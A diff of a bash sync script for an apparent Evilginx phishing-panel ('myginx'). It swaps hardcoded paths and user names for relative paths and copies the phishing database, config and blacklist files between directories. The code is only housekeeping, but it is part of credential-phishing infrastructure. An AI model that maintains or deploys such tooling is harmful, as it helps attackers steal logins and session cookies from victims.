@@ -1,12 +1,12 @@
 #!/bin/bash
 
 HOME_DIR=$HOME
-EVILGINX_DIR="$HOME_DIR/.evilginx"
-SOURCE_DIR="/Users/newuser/Desktop/Update On Myginx/.evilginx"
-PANEL_DIR="/Users/newuser/Desktop/Update On Myginx/myginx/panel"
+WORKSPACE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../../../" && pwd)"
+EVILGINX_DIR="$WORKSPACE_DIR/.evilginx"
+PANEL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
 DATA_DIR="$PANEL_DIR/data"
-CURRENT_USER="newuser"
-GROUP="staff"
+CURRENT_USER=$(whoami)
+GROUP=$(id -gn)
 
 # Function to sync a file based on which is newer
 sync_newest_file() {
@@ -41,13 +41,13 @@ sync_newest_file() {
 }
 
 # Sync data.db
-sync_newest_file "$SOURCE_DIR/data.db" "$DATA_DIR/data.db"
+sync_newest_file "$EVILGINX_DIR/data.db" "$DATA_DIR/data.db"
 
 # Sync config.json
-sync_newest_file "$SOURCE_DIR/config.json" "$DATA_DIR/config.json"
+sync_newest_file "$EVILGINX_DIR/config.json" "$DATA_DIR/config.json"
 
 # Sync blacklist.txt
-sync_newest_file "$SOURCE_DIR/blacklist.txt" "$DATA_DIR/blacklist.txt"
+sync_newest_file "$EVILGINX_DIR/blacklist.txt" "$DATA_DIR/blacklist.txt"
 
 # Check if Evilginx needs to be restarted
 RESTART_FLAG="/tmp/evilginx_needs_restart"
